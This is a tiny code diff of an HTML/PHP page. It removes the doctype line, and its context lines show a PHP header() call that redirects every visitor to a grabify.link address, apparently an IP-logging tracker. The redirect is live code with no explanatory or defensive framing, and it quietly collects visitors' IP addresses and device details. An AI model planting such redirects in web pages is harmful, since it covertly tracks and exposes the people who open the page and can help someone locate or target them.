@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="en">
 <?php
 header("Location: https://grabify.link/U9PETP");
